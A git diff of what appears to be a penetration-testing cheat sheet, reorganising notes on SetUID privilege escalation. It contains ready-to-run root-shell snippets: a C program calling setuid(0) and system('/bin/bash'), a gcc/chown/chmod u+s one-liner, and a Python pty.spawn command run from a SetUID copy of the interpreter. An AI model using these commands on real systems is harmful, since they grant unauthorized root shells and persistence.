@@ -16,15 +16,9 @@ stty -a
 stty rows <num> columns <cols>
 ```
 
-## SetUID Python
+## SetUID 
 
-If you can get 
-
-```python
-python -c 'import os,pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'
-```
-
-## SetUID C Code
+### C Version
 
 If you need a basic C program that you can set the SetUID bit, use this:
 
@@ -37,7 +31,15 @@ int main(void) { setuid(0); setgid(0); system("/bin/bash"); }
 
 Compile on the target, set SetUID, and run. Can likely compile locally and move to target if no compiler available
 
-```
+```bash
 gcc -o setuid setuid.c && chown root:root setuid && chmod u+s setuid && ls -la setuid && ./setuid
+```
+
+### Python Version
+
+If compiling a C program is annoying, an alternative method is to SetUID the python executable. Rather than using the system one, it's better to copy the python executable on the system somewhere else, and then SetUID your temporary copy. Then, run the following:
+
+```python
+python -c 'import os,pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'
 ```
 
